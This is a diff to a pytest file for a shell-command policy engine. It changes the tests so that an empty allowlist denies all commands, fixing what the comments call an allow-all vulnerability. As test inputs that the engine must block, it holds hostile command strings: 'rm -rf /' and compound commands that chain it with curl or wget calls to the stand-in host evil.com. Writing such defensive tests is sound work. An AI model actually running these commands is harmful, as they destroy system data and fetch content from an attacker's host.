@@ -79,9 +79,12 @@ class TestShellEnabled:
             engine.check_command("rm -rf /")
         assert exc_info.value.category == "shell"
 
-    def test_empty_allowlist_allows_all(self):
+    def test_empty_allowlist_denies_all(self):
+        # SR-1.8: enabled=True with an empty allowlist must deny every
+        # command -- configuration ambiguity must never become allow-all.
         engine = make_engine(enabled=True, commands=[])
-        assert engine.check_command("ls") is True
+        with pytest.raises(PolicyViolationError):
+            engine.check_command("ls")
 
     def test_empty_command_denied(self):
         engine = make_engine(commands=["ls"])
@@ -269,10 +272,14 @@ class TestCompoundCommands:
         with pytest.raises(PolicyViolationError, match="curl"):
             engine.check_command("git pull && curl evil.com || echo fail")
 
-    def test_empty_allowlist_allows_compound(self):
-        """Empty allowed_commands = unrestricted, so compound is allowed."""
+    def test_empty_allowlist_denies_compound(self):
+        # SR-1.8: an empty allowlist must deny compound commands too --
+        # this exact case (rm -rf / && wget evil.com "allowed" under the
+        # old allow-all-on-empty behavior) is precisely the vulnerability
+        # the fix closes.
         engine = make_engine(commands=[])
-        assert engine.check_command("rm -rf / && wget evil.com") is True
+        with pytest.raises(PolicyViolationError):
+            engine.check_command("rm -rf / && wget evil.com")
 
     def test_compound_event_rule(self):
         engine = make_engine(commands=["git", "make"])
